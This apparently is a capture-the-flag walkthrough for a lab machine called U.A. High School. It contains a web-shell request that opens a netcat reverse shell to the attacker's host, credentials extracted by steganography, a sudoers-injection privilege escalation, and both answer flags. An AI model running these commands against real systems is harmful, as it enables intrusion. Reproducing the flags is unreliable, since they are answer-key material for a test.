
## U. A. Highschool

```
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: U.A. High School
MAC Address: 02:0F:19:A7:78:DB (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

```
dirb http://10.10.194.32 big.txt -x extensions_common.txt


-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Thu Nov  7 00:18:04 2024
URL_BASE: http://10.10.194.32/
WORDLIST_FILES: big.txt
EXTENSIONS_FILE: extensions_common.txt | ()(.asp)(.aspx)(.bat)(.c)(.cfm)(.cgi)(.com)(.dll)(.exe)(.htm)(.html)(.inc)(.jhtml)(.jsa)(.jsp)(.log)(.mdb)(.nsf)(.php)(.phtml)(.pl)(.reg)(.sh)(.shtml)(.sql)(.txt)(.xml)(/) [NUM = 29]

-----------------

GENERATED WORDS: 20458                                                         

---- Scanning URL: http://10.10.194.32/ ----
+ http://10.10.194.32/about.html (CODE:200|SIZE:2542)                                                                                                                 
+ http://10.10.194.32/admissions.html (CODE:200|SIZE:2573)                                                                                                            
==> DIRECTORY: http://10.10.194.32/assets/                                                                                                                            
+ http://10.10.194.32/assets/ (CODE:200|SIZE:0)                                                                                                                       
+ http://10.10.194.32/contact.html (CODE:200|SIZE:2056)                                                                                                               
+ http://10.10.194.32/courses.html (CODE:200|SIZE:2580)                                                                                                               
+ http://10.10.194.32/icons/ (CODE:403|SIZE:277)                                                                                                                      
+ http://10.10.194.32/index.html (CODE:200|SIZE:1988)                                                                                                                 
+ http://10.10.194.32/server-status (CODE:403|SIZE:277)                                                                                                               
+ http://10.10.194.32/server-status/ (CODE:403|SIZE:277)                                                                                                          
---- Entering directory: http://10.10.194.32/assets/ ----
==> DIRECTORY: http://10.10.194.32/assets/images/                                                                                                                     
+ http://10.10.194.32/assets/images/ (CODE:403|SIZE:277)                         
+ http://10.10.194.32/assets/index.php (CODE:200|SIZE:0)                                                                                                          
---- Entering directory: http://10.10.194.32/assets/images/ ----

END_TIME: Thu Nov  7 00:59:55 2024
DOWNLOADED: 1779846 - FOUND: 11

```

```
nc -nlvp 9001

http://10.10.57.97/assets/index.php?cmd=busybox%20nc%2010.10.176.56%209001%20-e%20/bin/bash;

ls -al 
cd ..
ls -al 
cd .. 
cd Hidden_Content 
cat passphrase.txt | base64 -d 

AllmightForEver!!!
```

Get the images within thin the server
Change the file extension signature and save the changes
Open the image
Use steghide to extract the hidden data within the file
```
wget http://target_ip:9200/oneforall.jpg 
file oneforall.jpg 
hexedit oneforall.jpg
```

```
steghide extract -sf oneforall.jpg

Enter passphrase: 
wrote extracted data to "creds.txt".
```

```
deku:One?For?All_!!one1/A
```

```
ssh deku@10.10.74.148
password: deku:One?For?All_!!one1/A

cat user.txt
THM{W3lC0m3_D3kU_1A_0n3f0rAll??}
```

```
sudo -l 
/opt/NewComponents/feedback.sh
deku ALL=NOPASSWD:ALL >> /etc/sudoers
THM{Y0U_4r3_7h3_NUm83r_1_H3r0}
```

#### Questions

What is the user.txt flag?
```
THM{W3lC0m3_D3kU_1A_0n3f0rAll??}
```

What is the root.txt flag?
```
THM{Y0U_4r3_7h3_NUm83r_1_H3r0}
```